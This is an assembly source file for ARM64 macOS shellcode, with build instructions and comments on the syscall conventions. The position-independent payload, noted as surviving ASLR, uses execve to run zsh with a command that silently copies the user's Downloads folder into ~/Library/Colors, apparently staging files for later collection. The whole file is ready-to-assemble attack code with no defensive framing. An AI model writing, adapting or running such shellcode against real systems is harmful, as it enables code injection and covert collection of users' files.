; shellcode.asm
; ARM64 macOS execve shellcode
; Payload: execve("/bin/zsh", ["/bin/zsh", "-c", "cp -R ~/Downloads ~/Library/Colors/"], NULL)
;
; Assemble: as shellcode.asm -o shellcode.o
;
; Key ARM64 macOS notes:
;   - BSD syscall number goes in x16
;   - syscall #59 = execve
;   - syscall #1  = exit
;   - svc #0x80 triggers BSD syscalls (NOT svc #0 like Linux)
;   - adr is PC-relative, making this position-independent (survives ASLR)

.text
.global _main
.align 4

_main:
    ; ── Load argv[0] address into x0 ─────────────────────────────────────
    adr   x0,  arg0          ; x0 = pointer to "/bin/zsh"

    ; ── Build argv[] array on the stack ──────────────────────────────────
    sub   sp,  sp, #(8 * 4)  ; allocate 4 slots × 8 bytes = 32 bytes
    adr   x19, arg0           ; x19 = &"/bin/zsh"
    adr   x20, arg1           ; x20 = &"-c"
    adr   x21, arg2           ; x21 = &"cp -R ~/Downloads ~/Library/Colors/"
    str   xzr, [sp, #(8*3)]  ; argv[3] = NULL  (xzr always reads as 0)
    str   x21, [sp, #(8*2)]  ; argv[2] = &command_string
    str   x20, [sp, #(8*1)]  ; argv[1] = &"-c"
    str   x19, [sp]           ; argv[0] = &"/bin/zsh"

    ; ── Set up execve arguments ───────────────────────────────────────────
    mov   x1,  sp             ; x1 = argv (pointer to our stack array)
    mov   x2,  #0             ; x2 = envp = NULL

    ; ── Fire execve syscall ───────────────────────────────────────────────
    mov   x16, #59            ; syscall #59 = execve
    svc   #0x80               ; trigger BSD syscall

_exit:
    mov   x0,  #0             ; exit code 0
    mov   x16, #1             ; syscall #1 = exit
    svc   #0x80

; ── String data ───────────────────────────────────────────────────────────
arg0: .ascii "/bin/zsh\0"
arg1: .ascii "-c\0"
arg2: .ascii "cp -R ~/Downloads ~/Library/Colors/\0"